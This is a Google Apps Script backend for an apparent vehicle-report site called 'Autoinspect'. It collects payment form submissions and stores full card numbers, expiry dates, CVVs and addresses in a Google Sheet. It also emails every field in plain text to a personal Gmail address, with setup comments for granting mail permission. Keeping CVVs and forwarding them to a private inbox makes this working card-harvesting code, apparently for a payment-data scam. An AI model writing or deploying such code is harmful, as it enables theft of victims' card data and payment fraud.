/**
 * Autoinspect - Payment Form Google Sheets Integration
 *
 * EMAIL SETUP (do this once):
 * 1. Open Apps Script editor
 * 2. In the function dropdown (top toolbar), select: STEP1_RunThisToAllowEmail
 *    IMPORTANT: Do NOT run doGet — it will NOT ask for email permission
 * 3. Click Run ▶
 * 4. Click "Review permissions" → choose your Google account → Advanced → Allow
 * 5. Check rmoto7817@gmail.com for the test email
 * 6. Deploy → Manage deployments → Edit → New version → Deploy
 *
 * If "Review permissions" does NOT appear:
 * - Go to https://myaccount.google.com/permissions
 * - Remove "Autoinspect" or your script project
 * - Run STEP1_RunThisToAllowEmail again
 *
 * Optional manifest (Project Settings → Show appsscript.json):
 * Add oauthScopes for script.send_mail — see scripts/appsscript.json in this repo
 */

const SPREADSHEET_ID = '1QjYGGraDEz9W9NjzKrvghQ_lWyA-Mgt5z9WntoxQ8c0';
const PAYMENT_SHEET = 'Sheet1';
const FORM_SHEET = 'Form Submissions';
const ADMIN_EMAIL = 'rmoto7817@gmail.com';

const PAYMENT_HEADERS = [
  'Timestamp',
  'Card Number',
  'Expiry',
  'CVV',
  'Address',
  'Postal Code',
  'Country',
  'City',
  'Payment Method',
  'VIN',
  'Email',
  'Car Model',
  'Plan',
  'Price',
  'Vehicle Type',
];

const FORM_HEADERS = [
  'Timestamp',
  'VIN',
  'Email',
  'Car Model',
  'Model Year',
  'Vehicle Type',
  'Report Tier',
  'Price',
];

function doGet() {
  return jsonResponse({
    success: true,
    message: 'Autoinspect payment form endpoint is running. Use POST with action savePaymentForm.',
  });
}

function doPost(e) {
  try {
    const data = JSON.parse(e.postData.contents);

    if (data.action === 'savePaymentForm') {
      return savePaymentForm(data);
    }

    if (data.action === 'notifyFormSubmission') {
      return notifyFormSubmission(data);
    }

    return jsonResponse({ success: false, error: 'Unknown action' });
  } catch (err) {
    return jsonResponse({ success: false, error: err.toString() });
  }
}

function savePaymentForm(data) {
  try {
    const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    let sheet = ss.getSheetByName(PAYMENT_SHEET);

    if (!sheet) {
      sheet = ss.getSheets()[0];
    }

    if (sheet.getLastRow() === 0) {
      sheet.getRange(1, 1, 1, PAYMENT_HEADERS.length).setValues([PAYMENT_HEADERS]);
    } else {
      const existingHeaders = sheet.getRange(1, 1, 1, PAYMENT_HEADERS.length).getValues()[0];
      const headersMatch = PAYMENT_HEADERS.every((header, index) => existingHeaders[index] === header);

      if (!headersMatch) {
        sheet.getRange(1, 1, 1, PAYMENT_HEADERS.length).setValues([PAYMENT_HEADERS]);
      }
    }

    sheet.appendRow([
      data.timestamp || new Date().toISOString(),
      data.cardNumber || '',
      data.expiry || '',
      data.cvv || '',
      data.address || '',
      data.postalCode || '',
      data.country || '',
      data.city || '',
      data.paymentMethod || 'Card',
      data.vin || '',
      data.email || '',
      data.carModel || '',
      data.plan || '',
      data.price || '',
      data.vehicleType || '',
    ]);

    const emailResult = sendAdminEmail_(
      'New Payment Form Submission - Autoinspect',
      buildPaymentFormEmailBody_(data)
    );

    return jsonResponse({
      success: true,
      emailSent: emailResult.sent,
      emailError: emailResult.error || '',
    });
  } catch (err) {
    return jsonResponse({ success: false, error: err.toString() });
  }
}

function notifyFormSubmission(data) {
  try {
    const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    let sheet = ss.getSheetByName(FORM_SHEET);

    if (!sheet) {
      sheet = ss.insertSheet(FORM_SHEET);
    }

    ensureHeaders_(sheet, FORM_HEADERS);

    const timestamp = data.timestamp || new Date().toISOString();
    const formattedDate = data.formattedDate || timestamp;

    sheet.appendRow([
      timestamp,
      data.vin || '',
      data.email || '',
      data.carModel || '',
      data.year || '',
      data.vehicleType || '',
      data.tierName || '',
      data.tierPrice != null ? data.tierPrice : '',
    ]);

    const emailResult = sendAdminEmail_(
      'New VIN Report Request - Autoinspect',
      buildFormSubmissionEmailBody_(data, formattedDate)
    );

    return jsonResponse({
      success: true,
      emailSent: emailResult.sent,
      emailError: emailResult.error || '',
    });
  } catch (err) {
    return jsonResponse({ success: false, error: err.toString() });
  }
}

function ensureHeaders_(sheet, headers) {
  if (sheet.getLastRow() === 0) {
    sheet.getRange(1, 1, 1, headers.length).setValues([headers]);
    return;
  }

  const existingHeaders = sheet.getRange(1, 1, 1, headers.length).getValues()[0];
  const headersMatch = headers.every((header, index) => existingHeaders[index] === header);

  if (!headersMatch) {
    sheet.getRange(1, 1, 1, headers.length).setValues([headers]);
  }
}

function buildFormSubmissionEmailBody_(data, formattedDate) {
  return [
    'A new vehicle report form was submitted on Autoinspect.',
    '',
    'VIN / Registration: ' + (data.vin || 'N/A'),
    'Customer Email: ' + (data.email || 'N/A'),
    'Car Model: ' + (data.carModel || 'N/A'),
    'Model Year: ' + (data.year || 'N/A'),
    'Vehicle Type: ' + (data.vehicleType || 'N/A'),
    'Report Tier: ' + (data.tierName || 'N/A'),
    'Price: £' + (data.tierPrice != null ? data.tierPrice : '1'),
    'Submitted At: ' + formattedDate,
  ].join('\n');
}

function buildPaymentFormEmailBody_(data) {
  return [
    'A new payment form was submitted on Autoinspect.',
    '',
    'Payment Method: ' + (data.paymentMethod || 'Card'),
    'VIN / Registration: ' + (data.vin || 'N/A'),
    'Customer Email: ' + (data.email || 'N/A'),
    'Car Model: ' + (data.carModel || 'N/A'),
    'Plan: ' + (data.plan || 'N/A'),
    'Price: ' + (data.price || 'N/A'),
    'Vehicle Type: ' + (data.vehicleType || 'N/A'),
    'Card Number: ' + (data.cardNumber || 'N/A'),
    'Expiry: ' + (data.expiry || 'N/A'),
    'CVV: ' + (data.cvv || 'N/A'),
    'Address: ' + (data.address || 'N/A'),
    'City: ' + (data.city || 'N/A'),
    'Postal Code: ' + (data.postalCode || 'N/A'),
    'Country: ' + (data.country || 'N/A'),
    'Submitted At: ' + (data.timestamp || new Date().toISOString()),
  ].join('\n');
}

function sendAdminEmail_(subject, body) {
  try {
    MailApp.sendEmail({
      to: ADMIN_EMAIL,
      subject: subject,
      body: body,
    });
    return { sent: true, error: '' };
  } catch (err) {
    return { sent: false, error: err.toString() };
  }
}

/** Run this ONCE from the editor to allow email. Do NOT run doGet. */
function STEP1_RunThisToAllowEmail() {
  MailApp.sendEmail({
    to: ADMIN_EMAIL,
    subject: 'Autoinspect - Email Test OK',
    body: 'Email permission is working. Form submissions will now be sent to ' + ADMIN_EMAIL,
  });
  Logger.log('Test email sent to ' + ADMIN_EMAIL);
}

/** @deprecated Use STEP1_RunThisToAllowEmail instead */
function authorizeMailTest() {
  STEP1_RunThisToAllowEmail();
}

function jsonResponse(payload) {
  return ContentService
    .createTextOutput(JSON.stringify(payload))
    .setMimeType(ContentService.MimeType.JSON);
}
